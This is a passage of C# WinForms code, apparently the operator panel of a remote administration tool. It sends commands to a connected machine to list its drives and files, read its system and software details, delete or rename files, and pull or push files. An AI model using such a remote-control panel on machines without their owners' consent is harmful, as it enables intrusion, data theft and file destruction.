                    string text3 = array[3];
                    int flag = int.Parse(array[4]);

                    ListViewItem item = null;

                    if (flag == 1)
                        item = ListView_Files.Items.Add(text, 0);
                    else if (flag == 0)
                        item = ListView_Files.Items.Add(text, 1);

                    item.Tag = flag;

                    item.SubItems.Add(text1);
                    item.SubItems.Add(text2);
                    item.SubItems.Add(text3);
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Connection.Send("SystemInformation");
        }

        private void ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Connection.Send("Software");
        }

        private void SystemInformation_Load(object sender, EventArgs e)
        {
            RefreshToolStripMenuItem.PerformClick();
        }

        private void ComboBox1_Click(object sender, EventArgs e)
        {
            ComboBox1.Items.Clear();
            Connection.Send("ListDrives");
        }

        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListView_Files.Items.Clear();
            _currentDir = ComboBox1.SelectedItem.ToString();
            TextBox1.Text = _currentDir;
            Connection.Send("ListFiles" + _currentDir);
        }

        private void ListView_Files_MouseDoubleClick(object sender, EventArgs e)
        {
            if (ListView_Files.SelectedItems.Count == 0)
                return;

            string name = ListView_Files.SelectedItems[0].Text;

            _currentDir = _currentDir + name + "\\";
            _currentDir = Path.GetFullPath(_currentDir);
            TextBox1.Text = _currentDir;

            ListView_Files.Items.Clear();
            Connection.Send("ListFiles" + _currentDir);
            ListView_Files.Items.Add("..", 0);
        }

        private void PictureBox2_Click(object sender, EventArgs e)
        {
            try
            {
                ListView_Files.Items.Clear();
                Connection.Send("ListFiles" + TextBox1.Text);
                if (String.Compare(TextBox1.Text, "", false) != 0)
                {
                    ListView_Files.Items.Add("..", 0);
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                PictureBox2_Click(sender, e);
            }
        }

        private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListView_Files.Items.Clear();
            Connection.Send("ListFiles" + _currentDir);
            if (String.Compare(TextBox1.Text, "", false) != 0)
            {
                ListView_Files.Items.Add("..", 0);
            }
        }

        private void NewFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string text = Interaction.InputBox("Please specify a Name for the folder you want to create!", "New Directory");
            if (text != "")
            {
                Connection.Send("mkdir" + _currentDir + text);
                RefreshToolStripMenuItem1.PerformClick();
            }
        }

        private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ListView_Files.SelectedItems.Count == 0)
                return;

            int flag = (int)ListView_Files.SelectedItems[0].Tag;

            if (flag == 1)
                Connection.Send("rmdir" + _currentDir + ListView_Files.SelectedItems[0].Text);
            else
                Connection.Send("rmfile" + _currentDir + ListView_Files.SelectedItems[0].Text);

            RefreshToolStripMenuItem1.PerformClick();
        }

        private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ListView_Files.SelectedItems.Count == 0)
                return;

            string text = Interaction.InputBox("Please enter a new name", "Rename");
            if (text != "")
            {
                int flag = (int)ListView_Files.SelectedItems[0].Tag;

                if (flag == 1)
                    Connection.Send("rnfolder" + _currentDir + ListView_Files.SelectedItems[0].Text + "|" + text);
                else
                    Connection.Send("rnfile" + _currentDir + ListView_Files.SelectedItems[0].Text + "|" + text);

                RefreshToolStripMenuItem1.PerformClick();
            }
        }

        private void DownloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ListView_Files.SelectedItems.Count == 0)
                return;

            int flag = (int)ListView_Files.SelectedItems[0].Tag;

            if (flag == 0)
            {
                _currentDownloadFileName = ListView_Files.SelectedItems[0].Text;
                Connection.Send("sharefile" + _currentDir + ListView_Files.SelectedItems[0].Text);
            }
        }

        private void UploadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop).ToString();
            ofd.Multiselect = false;
            ofd.Title = "Select a File to upload!";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                Connection.Send("FileUpload" + _currentDir + "\\" + (new FileInfo(ofd.FileName)).Name + "|" + Convert.ToBase64String(File.ReadAllBytes(ofd.FileName)));
                RefreshToolStripMenuItem1.PerformClick();
            }
        }
    }
}